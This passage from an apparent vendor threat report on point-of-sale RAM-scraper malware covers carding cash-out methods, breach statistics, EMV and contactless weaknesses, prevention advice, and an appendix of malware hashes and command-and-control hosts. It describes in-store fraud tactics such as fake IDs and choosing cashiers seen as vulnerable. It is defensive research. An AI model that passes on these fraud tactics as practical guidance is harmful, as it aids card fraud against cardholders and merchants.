purchased, they\nhave the goods shipped to dump\nlocations (e.g., a foreign address, an\nempty house, etc.). Goods purchased\nwith stolen cards are then sold\non auction sites such as eBay for\nreduced prices. The income earned\nfrom selling such goods is converted\nto cash and stashed away or can be\nused to purchase anonymous virtual\ncurrencies such as Bitcoins.\n\n**•** **Use for in-store purchases: This is**\nthe riskiest cash-out method. Carders\nuse counterfeit credit cards to make\nin-store purchases. Organized gangs\nwho have access to expensive card\n\nwho have access to expensive card-\n\n\n-----\n\nduplication machinery create, use,\nand sell counterfeit credit cards.\nThey have the ability to duplicate\ncards’ security features and to\ncreate authentic-looking copies. The\nfoundation principle of fraudulent\nin-store purchases is to embody the\npersona of the real card owner in\norder to pull off theft. If carders wish\nto purchase a US$3,000 TV, they\nneed to dress and behave like people\nwho can afford to do so. Nervous\nactors will draw suspicion and\nattention. This scam works because\ncashiers rarely verify credit cards\nupon checkout unless the transaction\nis over some x worth of dollars. For\nlarge transactions, carders usually\n\n\ncarry fake IDs to add credibility to\nthe crime. Card protection or security\nfeatures are not consistent across\nissuers and cashiers may not be\nfamiliar with all of them. Carding\nforums advise going to visible\nminority or young female cashiers\nfor checkout, as they are considered\nmore “vulnerable.” Carding forums\nhave extensive lists of checkout\nscenarios to prepare for and provide\nadvice on how best to handle them.\n\nCarding is a quick means to easy payoff.\nCarders invest money to purchase dumps\nand, depending on the level of risk they\nare willing to bear, they can get small to\nsubstantial ROI.\n\n\n-----\n\n## LOOKING BEYOND THE HORIZON\n\n\n#### Detection Statistics\n\nPoS RAM scrapers target a wide range of\ncompanies across industries. The Trend\nMicro Smart Protection Network revealed\nthat between April and June 2014, the United\n\n\nStates recorded the highest number of PoS\nRAM scraper detections. Note that the data\nin the following figure is representative of\nour customer base and may not accurately\nrepresent the entire spectrum. It does provide\na good approximation of observed general\ntrends.\n\n\n##### United States 73.74% Philippines 4.62% Japan 4.41% Brazil 2.73% United Kingdom 2.52% Australia 2.52% Taiwan 2.10% Malaysia 2.10% Bahamas 1.89% Canada 1.68% Others 1.69%\n\n**Figure 46: PoS RAM scraper detection distribution by country**\n\n\nIt is not surprising that the largest volume\nof detections was seen in the United States\nbecause the country’s economy is heavily\ngeared toward purchasing goods and\nservices using credit cards. Consumers\nin other countries still tend to use cash or\ndebit cards more than credit cards. The\nhigh volume of credit card transactions that\ncompanies process in the United States\nmakes it a lucrative target for PoS RAM\nscrapers.\n\n\nSimilar to Verizon’s findings, Trend Micro\nSmart Protection Network data revealed that\nmost PoS attacks target companies in the\nretail industry. This industry, after all, has a\nvery high volume of credit card transactions,\nmaking it a lucrative target for harvesting\ncard data. Compromising a single PoS\nsystem usually yields data for thousands of\ncredit cards and is a preferred alternative to\ninfecting thousands of victims’ systems in\nhopes of stealing card data from them.\n\n\n-----\n\nRetail\n\nFood and beverage\n\nTechnology\n\nManufacturing\n\nUtilities\n\nHealthcare\n\nReal estate\n\nOthers\n\n**Figure 47: PoS RAM scraper detection distribution by industry**\n\n\n67.51%\n\n2.31%\n\n0.84%\n\n0.84%\n\n0.63%\n\n0.42%\n\n0.42%\n\n27.03%\n\n\n#### Credit Card Data Breaches in the United States\n\nThe number of credit card data breach\nincidents has been steadily rising in the\npast couple of years. Privacy Rights\nClearinghouse—a California-based nonprofit\ncorporation—publishes the “Chronology of\nData Security Breaches—Security Breaches\n2005‒Present.” This is a collection of all\n\n100\n\n50\n\n0\n\n\npublicly disclosed data on security breach\nincidents in the United States, including those\nthat involve credit cards. The organization\ncompiles this list from various sources (e.g.,\nmedia, Attorney-Generals’ offices, privacy\nwebsites, etc.). We mined data from this list\nto look for information on credit card data\nbreaches from 2005 to the present date.\nThe data we collected supports many of the\nobservations and claims previously made in\nthis paper.\n\n\n2005 2006 2007 2008 2009 2010 2011 2012 2013 2014\n\n**Figure 48: Publicly disclosed credit card data breach incidents from 2005 to 2014**\n\n\n-----\n\nThe concept of PoS RAM scraping was first\nintroduced at the end of 2008 or in early\n2009. As shown in the previous figure, the\nnumber of publicly disclosed credit card data\nbreach incidents significantly increased in\n2010. The high number of incidents remained\nsteady since then and peaked in 2011. (Note\nthat the 2014 data remains incomplete.)\nThis rise can be partially attributed to the\ndevelopment of new credit-card-data-stealing\nmalware that incorporate proven methods\nto bypass or exploit bugs in PCI DSS\nrequirements. The data trend clearly shows\nthat the business of credit card data theft is\nwell established and is not showing signs of\nslowing down in the near future.\n\nThe Privacy Rights Clearinghouse data\nprovides a breakdown of the different\nindustries that reported credit card data\n\n\nbreaches and defines the categories as\nfollows:\n\n**•** **BSO: Business — others**\n\n**•** **BSF: Business — financial and**\ninsurance services\n\n**•** **BSR: Business — retailers and**\nmerchants\n\n**•** **EDU: Educational institutions**\n\n**•** **GOV: Government and military**\n\n**•** **MED: Healthcare — medical**\nproviders\n\n**•** **NGO: Nonprofit organizations**\n\n\n##### BSR BSO BSF MED EDU GOV NGO\n\n\n##### 46.99% 22.41% 9.64% 8.92% 5.54% 3.37% 3.13%\n\n\n**Figure 49: Publicly disclosed data on the types of organization that have suffered credit card data**\n\nbreaches\n\n\nAs shown above, the industry distribution\nclosely matches data from the Trend Micro\nSmart Protection Network and Verizon. Most\nof the attacks target retailers and merchants,\nas companies in the retail industry process\na huge volume of credit card transactions.\nSuccessfully compromising the networks of\nbig retailers or merchants yields thousands of\ncredit card credentials in a very short period\nof time, making them lucrative targets.\n\n\nThe Privacy Rights Clearinghouse also\nprovides a breakdown of the breach methods\nemployed in credit card data breaches. The\nbreach methods are as follows:\n\n**•** **Unintended disclosure (DISC):**\nSensitive information posted publicly\non a website, mishandled, or sent to\nthe wrong party via email, fax, or mail.\n\n\n-----\n\n**•** **Hacking or malware (HACK):**\nElectronic entry by an outside party,\nmalware, and spyware.\n\n**•** **Payment card fraud (CARD): Fraud**\ninvolving debit and credit cards that\nis not accomplished via hacking. For\nexample, skimming devices at pointof-service terminals.\n\n**•** **Insider (INSD): Someone with**\nlegitimate access intentionally\nbreaches information such as an\nemployee or a contractor.\n\n**•** **Physical loss (PHYS): Lost,**\n\n\ndiscarded, or stolen nonelectronic\nrecords such as paper documents.\n\n**•** **Portable device (PORT): Lost,**\ndiscarded, or stolen laptop, PDA,\nsmartphone, portable memory device,\nCD, hard drive, data tape, etc.\n\n**•** **Stationary device (STAT): Lost,**\ndiscarded, or stolen stationary\nelectronic device such as a computer\nor server not designed for mobility.\n\n**•** **Unknown or others (UNKN):**\nBreach was caused by unknown or\nundetermined circumstances.\n\n\n##### HACK INSD PORT CARD PHYS DISC STAT UNKN\n\n\n##### 52.29% 16.39% 7.71% 6.51% 5.78% 5.30% 2.65% 3.37%\n\n\n**Figure 50: Publicly disclosed data on methods used in credit card data breaches**\n\n\nIt is not surprising that hacking and malware\nattacks comprise the bulk of breach methods\ndiscovered across incidents. Hacking or\nmalware attacks succeed because they\nprovide cybercriminals a certain degree\nof anonymity, convenience (i.e., remote\ndeployment), and flexibility to make quick\n\n\nmodifications in order to adjust to changing\nconditions.\n\nThe following table lists the largest publicly\ndisclosed credit card data breach incidents\nin the United States from 2005 to the present\nday.\n\n\n-----\n\n|Massive U.S. Credit Card Data Breaches from 2005 to 2014|Col2|Col3|\n|---|---|---|\n|Organization|Number of Credit Card Records Stolen [61], [62]|Date Made Public|\n|TJX Companies|45.6M|January 12, 2007|\n|Heartland Payment Systems|160M|January 20, 2009|\n|Sony|12M|April 27, 2011|\n|Target Corporation|40M|December 13, 2013|\n\n\nNote that the table above only includes\nincidents wherein more than 10 million credit\ncard records were stolen because those\nincidents made headlines. Looking at the\ndata above, we see a pattern emerge—a\nmassive credit card data breach incident\noccurs every two years.\n\n#### Other Credit Card Data Theft Methods\n\nCredit card data theft has been occurring\nlong before the concept of RAM scraping\nwas first introduced. PoS RAM scraping is\na convenient way to steal large volumes of\nunencrypted credit card data, making it a\npopular attack vector among hackers. Other\ndata theft methods include the following:\n\n**•** **Attack e-commerce websites: A**\nlarge percentage of daily credit card\ntransactions occur on e-commerce\nwebsites. Hackers use a variety\nof breach vectors to attack poorly\nprotected or configured e-commerce\nwebsites (e.g., via SQL injection,\nvulnerability exploitation, etc.). Once\nthe websites are compromised,\nhackers can access encrypted or\nunencrypted credit card databases\nand steal data. E-commerce websites\ndo not have access to entire sets\n\n\nof Tracks 1 and 2 credit card data\nrequired to duplicate cards but\nthey store enough information for\ncybercriminals to use in committing\ncard-not-present transaction fraud.\n\n**•** **Steal encrypted databases: PCI**\nDSS requires credit card data at rest\nto be encrypted. The Privacy Rights\nClearinghouse data has reports of\nseveral breach incidents wherein\nencrypted credit card databases were\nstolen. Hackers may have retrieved\nor recovered the decryption keys\nfrom other systems, applications, or\nRAM and can decrypt the stored data\noffline.\n\n**•** **Target non-PCI-DSS-certified**\n**merchants: Retailers and merchants**\nare not the only ones that process\ncredit card transactions. All sorts of\ncompanies (e.g., medical clinics,\ninsurance brokers, rental offices,\nnotary publics, etc.) accept credit\ncard payments as well. Some of them\nmay not be PCI DSS certified and\nmay store credit card data, along with\nother customer records, unencrypted\nin their systems.\n\n**•** **Sniff networks: PCI DSS requires**\ncredit card data in transit to be\n\n\ndo not have access to entire sets credit card data in transit to be\n\n\n-----\n\nencrypted when transferred over\nthe Internet. No such encryption\nrequirements exist for credit card\ndata transferred over LANs or WANs.\nIf hackers manage to breach the\nnetworks of companies that process\ncredit card transactions, they can\nsniff LAN or WAN traffic and can\nmatch patterns in order to retrieve\ncredit card data. This is a passive and\nstealthier strategy compared with PoS\nRAM scraping.\n\n**•** **Exploit vulnerable PoS software:**\nPoS software have vulnerabilities\neven though we have not seen\nthem publicly disclosed. Hackers\nmay discover vulnerabilities in PoS\nsoftware and may exploit them in\norder to gain remote access to the\nprocess memory space in the RAM to\nsteal credit card data.\n\n**•** **Exploit APIs and proprietary**\n**protocols: The different parties**\ninvolved in the credit card transaction\nflow model use proprietary protocols\nand public or private APIs for\ncommunication. Hackers may\ndiscover flaws or vulnerabilities in\nthese protocols or APIs and exploit\nthem in order to gain access to credit\ncard transaction data.\n\n**•** **Steal personal information:**\nHackers can steal customers’\npersonal information (e.g., date\nof birth, Social Security Number,\naddress, etc.), which are not explicitly\nprotected by PCI DSS requirements.\nThey can then sell this information\nunderground. Cybercriminals who\npurchase this data can use it to\ncommit identity theft and apply for\nlegitimate credit cards using victims’\npersonal information.\n\nThe list above is, by no means,\ncomprehensive but it shows that sensitive\n\n\ndata is under constant threat unless strong\nprotection measures are employed.\n\n#### New Credit Card Technologies\n\nNew technologies are being introduced in\nthe North American market to help curb or\nprevent credit card fraud as well as to make\ntransactions more convenient and secure.\nWe will focus on two technologies that are\nnow being implemented in many countries—\nEMV chips and contactless radio frequency\nidentification (RFID).\n\n##### EMV\n\nEMV or chip-and-PIN credit cards are now\nwidely used in Canada and Mexico. The\nUnited States is scheduled to switch to EMV\ncredit cards by October 2015. [63] EMV\ncards are also being widely used in South\nAmerican, European, and Asian countries.\n\n**Figure 51: CIBC credit card that uses the EMV**\n\nand RFID technologies\n\nEMV is the global standard for integrated\ncircuit cards (ICCs). Europay, MasterCard,\nand Visa (EMV) created the EMV consortium\nback in 1994. EMV cards store encrypted\nTracks 1 and 2 data on the chip. They\ninteract with PoS terminals that have\nICC readers and use the EMV-defined\nprotocol for transactions. Similar to debit\ncards, cardholders need to input a PIN\nfor authentication before transactions are\nprocessed.\n\n\n-----\n\nAfter the Target data breach in\nDecember 2013, EMV credit cards have\nbeen the focus of much discussion, as\nmany see it as the solution to prevent future\ncredit card data breaches. The reality is,\nEMV credit cards cannot prevent PoS RAM\nscraper attacks. [64], [65] As previously\nmentioned, EMV cards store encrypted\nTracks 1 and 2 credit card data on the chip.\nThis chip makes it extremely difficult for\ncybercriminals to manufacture counterfeit\ncredit cards using stolen data, which helps\nreduce counterfeiting and lost or stolen card\nfraud. If the EMV Tracks 1 and 2 data is\n\n300\n\n\nsent to the PoS system for processing, it will\nbecome susceptible to PoS RAM scraper\nattacks because the decrypted data resides\nin the RAM.\n\nU.K. credit card fraud statistics show that\neven after EMV cards were introduced in the\ncountry, losses related to card-not-present\nfraud dramatically increased in number. [66]\nThis shows that cybercriminals are using\nstolen credit card data for online purchases\ninstead of manufacturing and using\ncounterfeit cards.\n\n\nChip and PIN\ndeployment\nCard not present\nperiod\n\nCounterfeit\n\n\n150\n\n0\n\n\nLost and stolen\n\nMail nonreceipt\n\nCheck fraud\n\n\nID theft\n\nOnline banking\n\n\nChip and PIN\ndeployment\nperiod\n\n0\n\n\n2004 2005 2006 2007 2008\n\n**Figure 52: Fraud statistics on U.K.-issued cards**\n\n**Source: “Chip and PIN Is Broken”**\n\n\nResearchers from the University of\nCambridge showed that cybercriminals\ncan cheaply construct special devices\nthat intercept and modify communications\nbetween EMV credit cards and PoS\nterminals, fooling the latter into accepting\nfake successful PIN verifications. Even\nthough this is a proof-of-concept (PoC)\nattack, it still shows that fundamental\nflaws exist in the EMV protocol. As EMV\ncard usage becomes more widespread,\ncybercriminals will inevitably discover\nexploitable flaws in such cards.\n\n\n##### CONTACTLESS RFID CARDS\n\nContactless payment technology in credit\ncards (e.g., MasterCard’s PayPass, Visa’s\npayWave, etc.) uses RFID and allows\ncardholders to just wave their cards in front\nof contactless payment terminals to complete\ntransactions. Because signature or PIN entry\nis not required for contactless purchases,\na maximum purchase limit per transaction\nis set by credit card issuers, typically\namounting to $25. Contactless payment\ncards do not use a universal protocol for\n\n\ncards do not use a universal protocol for\n\n\n-----\n\npayment transactions. Each card brand\ninstead defines its own proprietary protocol\nbased on EMV principles. This means that a\nMasterCard PayPass reader cannot process\ntransactions for Visa payWave cards. [67]\nWith the growing popularity of contactless\npayment cards, however, hybrid card readers\nhave now been developed.\n\nContactless payment cards all use the\nsame communication protocol—EMV\nContactless Communication Protocol\nSpecifications—for communication with nearfield-communication (NFC)-enabled devices.\nMany smartphones today are NFC enabled\nand have apps that can read all of the data\n\n\nstored in contactless cards. There are open\nsource software libraries for reading and\nextracting data from contactless cards, which\ncan be used to build custom NFC apps.\nArmed with an NFC-enabled smartphone\nand an app that can read contactless card\ndata via NFC, hackers can brush against\npotential victims in crowded public spaces\nand wirelessly steal their credit card data\nin an act that has been dubbed “electronic\npickpocketing.” The simple solution to\nprevent electronic pickpocketing is to put\ncontactless cards in shielded sleeves that will\nblock the electromagnetic energy required to\npower the RFID chip on them.\n\n\n-----\n\n## CONCLUSION AND RECOMMENDATIONS\n\n\n#### Prevention\n\nPCI DSS does not offer new secure\ntechnologies to protect electronic payment\nsystems but instead provides requirements\nto implement additional layers of security\ncontrol around existing technologies. PoS\nsystem operators should follow security best\npractices to improve their overall system\nsecurity posture. A few tips are provided\nbelow.\n\n##### HARDWARE BASED\n\n   - Install ideally multitier hardware\nfirewalls to protect networks.\n\n   - Deploy breach detection systems\n(BDSs) to detect targeted attacks.\n\n   - Deploy intrusion detection and\nprevention systems (IDPSs) to scan\ninbound and outbound traffic.\n\n   - Incorporate two-factor authentication\nfor remote network access among\nemployees, administrators, and third\nparties.\n\n   - Implement point-to-point encryption.\n\n##### SOFTWARE BASED\n\n   - Install ideally multitier software\nfirewalls to protect networks.\n\n   - Change default passwords,\nconfigurations, and encryption keys.\nUse strong passwords.\n\n\n\n- Eliminate unnecessary ports,\naccounts, services, scripts, drivers,\nfeatures, subsystems, file systems,\nWeb servers, and protocols.\n\n- If remote access is not required,\ndisable it.\n\n- Implement point-to-point encryption.\n\n- Encrypt communications between\napplications and data.\n\n- Deploy the latest version of OSs and\nregularly apply patches.\n\n- Regularly apply updates to installed\nsoftware.\n\n- Restrict access to the Internet on PoS\nsystems.\n\n- Use whitelisting to only allow\napproved applications to run.\n\n- Put a mechanism in place to identify\nif and when system components\nchange.\n\n- Set up PoS systems to automatically\nreimage every 24 hours.\n\n- Restrict communication in and out of\nenvironments to only what is required.\n\n- Install and regularly update antimalware solutions to protect against\nmalware and malicious URLs.\n\n- Deploy a vulnerability scanner to\nscan systems, applications, and Web\napplications.\n\n\n-----\n\n   - Deploy DLP software to discover,\nmonitor, protect, and manage\nconfidential data.\n\n##### POLICY BASED\n\n   - Enforce strict policies regarding\nphysical PoS system repairs and\nupgrades.\n\n   - Routinely delete stored cardholder\ndata.\n\n   - Restrict access to the Internet on PoS\nsystems.\n\n   - Implement log and audit trails on PoS\nsystems.\n\n   - Limit internal physical access to PoS\nsystems.\n\nIt is important to understand that following\nsecurity best practices does not guarantee\nthat PoS systems will never get infected.\nIt will just make it extremely difficult for\ncybercriminals to infect them. Determined\nhackers or cybercriminals will still invest time\nto look for weaknesses in companies’ IT\ndefenses and may eventually find a way into\ntheir PoS systems.\n\n#### Trend Micro Solutions\n\nTo address risks within evolving businesses,\nTrend Micro provides a security solution that\nis open, automated, and highly scalable, that\nfits their existing infrastructure, seamlessly\nintegrating with key environments such as\nVMware® or cloud environments such as\nAmazon Web Services.\n\nChanges in system components can occur\nfor many reasons, many of which are not\ndue to attacks against systems. That said,\nmonitoring systems such as PoS devices\nfor changes is becoming more critical when\nit comes to security control. It can not only\nprovide early indications of problems, it is\n\n\nactually required by various compliance\nstandards such as PCI DSS.\n\nTrend Micro Deep Security offers File\nIntegrity Monitoring capabilities to monitor\ncritical OS and application files such as\ndirectories, registry keys, and values to\ndetect and report malicious and unexpected\nchanges in real time. [68] These include\nchanges to PoS systems.\n\nDeep Security can restrict communication in\nand out of environments through a firewall\npolicy that can be tailored for specific server\nrequirements and can protect against both\ninbound and outbound communication.\nIts firewall capabilities offer logging and\nalerting to make it easier to troubleshoot and\nmanage.\n\nAs companies demand constantly evolving\napplication use, it is often difficult to keep\nup with patching systems against known\nvulnerabilities. This is where Deep Security\nIntrusion Prevention capabilities that protect\nagainst potential exploits to vulnerabilities are\nimportant to have on the list. An important\ncapability of our intrusion prevention is\nthe ability to automatically update security\npolicies to ensure that the right protection is\napplied, even before you have had a chance\nto patch.\n\nFinally, Deep Security Anti-Malware that\nincludes Web reputation detection will not\nonly protect against malware but will also\ndetect and protect against known malicious\nURLs.\n\nWhen those applications are available\nthrough the Web and provide customers,\npartners, or global employees the ability\nto share information, detection of potential\nthreats or occasional penetration testing is\nnot enough, especially as the number of apps\nincreases. Trend Micro offers Deep Security\nfor Web Apps, a comprehensive, integrated\nsoftware-as-a-service (SaaS) offering that\ncontinuously detects vulnerabilities, delivers\n\n\nprovide early indications of problems, it is\n\n\n-----\n\nactionable security insight, and protects\napplications with Secure Sockets Layer\n(SSL) certificates to encrypt transactions\nand communications, as well as Intrusion\nPrevention and Web Application Firewall\n(WAF) rules.\n\nIn any attack, besides identifying components\nusing endpoint or server security solutions,\na network approach is also favored. Trend\nMicro Custom Defense solutions can support\na retail organization in a number of ways,\nnamely: [69]\n\n   - Trend Micro Deep Discovery can\ndetect the download of malware and\nRATs without antivirus signatures. [70]\n\n   - Deep Discovery can detect certain\nlateral movements and the spread of\nmalware.\n\n   - Deep Discovery can detect C&C\ncommunication, both inbound and\noutbound.\n\n   - Deep Discovery can detect\nboth external and internal C&C\ncommunication.\n\n   - Deep Discovery can detect internal\ndata movement.\n\n   - Deep Discovery can detect bulk data\nexfiltration.\n\n\n#### Conclusion\n\nCredit card data breach is an established\ncybercrime that will not show signs of slowing\ndown in the near future. Cybercriminals\ntarget all industries and use a wide range of\nbreach techniques. Research revealed that\nmost PoS RAM scrapers affected companies\nin the retail industry, as they have very high\ncredit card transaction volumes, making them\nlucrative targets for harvesting Tracks 1 and\n2 data.\n\nNew credit card technologies are being\nintroduced in the North American market to\nhelp curb or prevent credit card fraud as well\nas to make transactions more convenient\nand secure. Though these technologies\nwill help reduce counterfeiting and lost or\nstolen credit card fraud, they cannot prevent\nPoS RAM scraper attacks. On the flip side,\nthey will introduce new attack vectors that\ncybercriminals can exploit to steal credit card\ndata.\n\nBob Russo’s Statement for the Record is\naccurate, “Our work is broad for a simple\nreason: there is no single answer to securing\npayment card data. No one technology is a\npanacea; security requires a multilayered\napproach across the payment chain.” [64]\n\n\n-----\n\n## APPENDIX\n\n|PoS RAM Scraper C&C Data|Col2|Col3|\n|---|---|---|\n|SHA-1|C&C Server Address|Trend Micro Detection Name|\n|121d097c4cc6cabd5989675e9ec01981b921f381|fra.ishareda.com||\n|8259ea5b9b4c7a2ba89c5c45aaa5ca6cce330282|hoqou.su||\n|fe98267b11389841a5197a5fc8a0b2ad2dceed0c|666andro.net||\n|stylishkattyrock.com 4e682b34c3e122e55d21f9a501b9f13afb7437a9 BKDR_ALINA.KER redsylockyboons.com|stylishkattyrock.com||\n||redsylockyboons.com||\n|208.98.63.228 5563e4c2987eda056b3f74716c00d3014b9306bc uipoqworkas.com BKDR_ALINA.NA someligeoas.com|208.98.63.228||\n||uipoqworkas.com||\n||someligeoas.com||\n|zwaonoiy.com 46edd03812670f0cbef733894b9ce06ed6a6ba8c 208.98.63.228 BKDR_ALINA.NB 193.169.87.147|zwaonoiy.com||\n||208.98.63.228||\n||193.169.87.147||\n|jikobins.com 183bdebb8872f12f5379b8d40030059513317361 ioconzus.com 204.188.242.201 BKDR_ALINA.NG ioconzus.com 38540d09a90a60afdc7d5039cf37c453e4055ee2 jikobins.com|jikobins.com||\n||ioconzus.com||\n||204.188.242.201||\n||ioconzus.com||\n||jikobins.com||\n\n\n-----\n\n|PoS RAM Scraper C&C Data|Col2|Col3|\n|---|---|---|\n|SHA-1|C&C Server Address|Trend Micro Detection Name|\n|38540d09a90a60afdc7d5039cf37c453e4055ee2|204.188.242.201|BKDR_ALINA.NG|\n|stylishkattyrock.com 10a4cfc9dedff9d254b73c32b696299d26b19ca7 BKDR_ALINA.NH redsylockyboons.com|stylishkattyrock.com||\n||redsylockyboons.com||\n|43afd24048a0281d6f4699627d2363e847b34aa8|888andro.net|BKDR_ALINA.NI|\n|5485d8332d12423fcc8920eedf87194a1ed154b8|204.188.242.201|BKDR_ALINA.NJ|\n|32538bc513641cc37b21c93b3aaee142ccf59ffa|204.188.242.201|BKDR_ALINA.OA|\n|tyrnslqoa.biz ea8f102be4ea3a641e7970c18d026917f68212c6 BKDR_ALINA.OB 208.98.63.226/goose/ push.php|tyrnslqoa.biz||\n||208.98.63.226/goose/ push.php||\n|ioconzus.com 7896b0aada9e491b15996bd6b73964c10e977a6c jikobins.com BKDR_ALINA.OC 204.188.242.201|ioconzus.com||\n||jikobins.com||\n||204.188.242.201||\n|9107d1b360ff8e50141661729503ec1907529498|208.98.63.226/goose/ push.php|BKDR_ALINA.OE|\n|fc5255f94762392f7a4e0269c8857750e1e7be93|208.98.63.226/goose/ push.php|BKDR_ALINA.OF|\n|68276c0b7e3f086d009263c0758a61907567f366|204.188.242.201|BKDR_ALINA.OH|\n|ioconzus.com 15cb85e6373011981b2a4961bbcb5708fb5b3dda jikobins.com BKDR_ALINA.OI 204.188.242.201|ioconzus.com||\n||jikobins.com||\n||204.188.242.201||\n\n\n-----\n\n|PoS RAM Scraper C&C Data|Col2|Col3|\n|---|---|---|\n|SHA-1|C&C Server Address|Trend Micro Detection Name|\n|a368829bc400284f1803f4e5de5844ae4ccdedf1|204.188.242.201|BKDR_ALINA.OJ|\n|19c28475fb7e5b2cbefe3e7d74ba51c950a964ce|204.188.242.201|BKDR_ALINA.OL|\n|13ef5f8e812a692c0893ad935b48b3f1a4aec615|84.22.106.87/ asdwer/1.php|BKDR_ALINA.OM|\n|host3.com aadb31534bd276fa2f3029e89e93140a48a5ce0d fastbussineslife.net BKDR_ALINA.ON 204.188.242.201|host3.com||\n||fastbussineslife.net||\n||204.188.242.201||\n|1b3dcfeda9d01dc428d954812c81f7bda1af5373||BKDR_DEXTR.A|\n|6c090aa226a719d8d948ad5244252b8b0c5e0af2|||\n|1aa7185a16ca692488c76204bec5eabce3c07b5e|37.0.122.142/alfa/ gateway.php||\n|5d46b487372ccd6939da7aa4c68b75d0740501ed|62.76.44.111/fk/ gateway.php||\n|dde7cfcc196df7107a5ca31ac4ea120b667dd861|151.248.115.107/ ial9121988921973dsa das8dsa080dsa/ gateway.php||\n|df963c2ef9544c2b49488a67bf9efe841af53f0f|62.76.44.111/fk/ gateway.php||\n||backup-service.in.ua/ alfa/gateway.php||\n||37.0.122.142/alfa/ gateway.php||\n|ab96ff2df5092eb36082e948f1524ec339de8965|89.45.14.69/a/gateway. php|BKDR_DEXTR.D|\n\n\n-----\n\n|PoS RAM Scraper C&C Data|Col2|Col3|\n|---|---|---|\n|SHA-1|C&C Server Address|Trend Micro Detection Name|\n|7cd3619280f57a0d8b27ec0374256f4c64f4f9a8|46.19.143.252|BKDR_DEXTR.OT|\n|047fef6f231e25fe46147e173a2ecf677aaa4898|89.45.14.69/a/gateway. php||\n|0f9979c65e72ea07bef715eb3c549c5ca1b50f16|188.240.34.210/ outpost/exes/sysproc. exe||\n|0fa6eb784c3a8a5ae65dba50f8da878dceecf467|||\n|14b7ba38d0dc8b6009217b5a4a15cd7d49a3a2c4|||\n|17e0cfaeb3f89814310f423b2605e6f80df18557|||\n|246d1d33e72d7e5e5b27da7c2cf8e912e577641e|||\n|33c16196ec7a2f0029a0506955eaf14b22cbdffe|64.90.187.223||\n|3a2c85304e208cc3be0fc887c7f18b4f89a527ef|46.19.143.252/w3e4/ gateway.php||\n|3e2c3966d856331c184b810fd32b7dfc8e5080df|62.76.44.111/fk/ gateway.php||\n|3fa9fc69c1f78b87ed3a2975f87056735c921e73|64.90.187.223||\n|499458fe40103ef993b05cb1cced3bdbffd71428|46.19.143.252||\n|4e7f1ff74fb8e6b82bd07c55522d4f5a9f5a5249|byroec2.com||\n|55ded557a7efa1de0644ba6cdae5879816e365a7|houseofcarders.com||\n|5999736d0c5a203aeb242689250a27396f39e996|5.199.165.24||\n|5dc93a9ef1f2611a6d9967c697fa8680300878a0|www . g45d . net||\n\n\n-----\n\n|PoS RAM Scraper C&C Data|Col2|Col3|\n|---|---|---|\n|SHA-1|C&C Server Address|Trend Micro Detection Name|\n|6e88d96a56bb35fa465a3a92b6cf7ffac69a12b4|666.andro.net||\n|6eb299b368d94fb6f340d40d0c284830f22f4664|||\n|7b9ccd34334ad2d9c728122162f399d8313f9e89|||\n|99aa3b75d8c9744e46ba4fe301a890a636eb4ad7|||\n|a21219db5b9c43e9ed0b475c1df1c1e414413443|||\n|87c120dccbc9e7c7d0f0c5e6e6e5eb692da97422|109.163.229.57/w3e4/ gateway.php||\n|8e03f0f6d9ac7640c179c40844ce3718c3884278|89.45.14.69/a/gateway. php||\n|a5da1c138c7cf738e5072d23aadffa103f57c9cb|78.108.93.135||\n|a6560383ec0843ca6584c7c2a0c163b2c1ab3fc9|www . pgdex . com||\n|ace7e975bb54117a906c07161883a51f14a701cb|62.149.24.147/dexter/ gateway.php||\n|affd76583196c8dace21aab4076a1fd0e3ec177c|89.45.14.69/a/gateway. php||\n|b870a82781aa0dbdb0c2fcedea5ee58f01321885|||\n|c8745571b2933ea1c56e5dc069d5449875990dcf|||\n|858d9b29ac3b808b754dc17fea48b6a26dc854b4|||\n|c05381ccab1b49f11b0898d0ea64fb2df8b6f2cb|casinoloader.com||\n|e568d933209b721ac6a8ec4837a603bd80633fa5|macar.na.tl||\n|f325e26c82eb68a05af93890c13a246202ea658b|houseofcarders.com||\n\n\n-----\n\n|PoS RAM Scraper C&C Data|Col2|Col3|\n|---|---|---|\n|SHA-1|C&C Server Address|Trend Micro Detection Name|\n|f87ad687168d7d418b92a3d8019bb44ffe00cc03|37.221.171.104||\n||www . y4j5 . com||\n||backup-service.in.ua/ alfa/gateway.php||\n||141.255.165.145||\n||37.0.122.142||\n|663a22ba842a1cce519615296a88d66eb0035f88|www . posterminalworld . la|BKDR_HESETOX.B|\n|7536f3f518825b4d66b5fa34bbb2782e5deb1038|||\n|8f1fbf88831e7b6c4186603cad0f0df89b1d0aee|||\n|e1efc96c22a55933816e81bc7f9efa9339ac6a25|gmxdotkomlive.ru||\n|00444b93a3f3b68058a5227ae57a91646ff8b3b5|ibenterprises.com.pk||\n|12b780648ab830e473edb23a7b2edafbdf9e814a|test.debian-bg.org||\n|4bb9ddc057d94f3792da390fb97ce75569835f95|www . lolo . co . in||\n|55f3a29e610fd1e0ffe0b36035807b7f29e4a7eb|www . 3m21l . com||\n|5631a8d02f2f29804bdd065544bcaf5938e1632c|mx3.ringtonetrip.com||\n|87ef9ed0f5c24c91bc6e8c4a601460f317c05e69|vsk.ignorelist.com||\n|8fdeb5e6e178f0c88ab0b48c0c14a7e3b691514d|www . posterminalworld . la||\n|92931192720392c70c0e9e99eaee2729b15013be|www . cam2cam47 . infosite . me||\n\n\n-----\n\n|PoS RAM Scraper C&C Data|Col2|Col3|\n|---|---|---|\n|SHA-1|C&C Server Address|Trend Micro Detection Name|\n|c4aa7606137010ba9c3fc7433bc127275b7eb181|fasunshi.com||\n|d56e22f190f8a5336cbd1160ca776ceae5e0588c|checkmeout.host-ed. me||\n|e134e8b327b93c5d25168c8dfbf0c3f8a9e9238a|adobeupdater.ng||\n|ec1294c2625ad714032be065f811bd153bdd1992|5.199.164.240||\n||www . ibenterprises . com . pk||\n||144.76.119.139||\n|b85ea67877ecdd4f13f7822375d9af5f775e45e7|38robpl95.esy.es||\n|f9e70830ca9b8859e8503112ba9a6a9af47ca6db|www . posterminalworld . la||\n|0fdd3f4bcef35561dffc4eb50cefa6dc695560bd||BKDR_PCCLIENT.DX|\n|f71971c5e9205f1a6b17f30b7e69975228ebbe16|||\n|7e4538c27de7c24a439a82309d7241fb0d45249a|www . posterminalworld . tk|BKDR_VSKIM.A|\n|5572a1ddebb75e964708c53059514ecea24290dd|654andro.net|TROJ_ALINAOS.A|\n|f69d253bad4e4d2c90663c18b9f341ac2fd89145|141.255.160.58|TROJ_BANLOAD. KGD|\n|6152afc75a669503083f21df23b636013f807c8f|cl3an45u.biz|TROJ_COMREROP. 